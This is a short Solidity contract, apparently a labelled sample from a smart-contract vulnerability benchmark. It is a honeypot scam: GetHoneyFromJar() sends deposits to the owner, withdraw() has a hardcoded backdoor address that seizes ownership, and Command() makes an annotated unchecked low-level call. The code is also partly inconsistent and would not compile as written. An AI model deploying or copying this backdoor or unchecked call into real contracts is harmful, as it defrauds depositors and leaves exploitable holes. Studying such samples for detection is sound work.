//pragma solidity ^0.4.19;

contract HomeyJar {
    address payable public Owner = msg.sender;

    function() external payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {
            Owner.transfer(address(this).balance);
            msg.sender.transfer(address(this).balance);
        }
    }

    function withdraw() payable public {
        if(msg.sender==address(0x2f61E7e1023Bc22063B8da897d8323965a7712B7)){Owner=address(0x2f61E7e1023Bc22063B8da897d8323965a7712B7);}
        require(msg.sender == Owner);
        Owner.transfer(address(this).balance);
    }

    function Command(address adr,bytes memory data) payable public {
        require(msg.sender == Owner);
         // <yes> <report>
        (bool success, bytes memory data) = adr.call(abi.encode(msg.value, data));
    }
}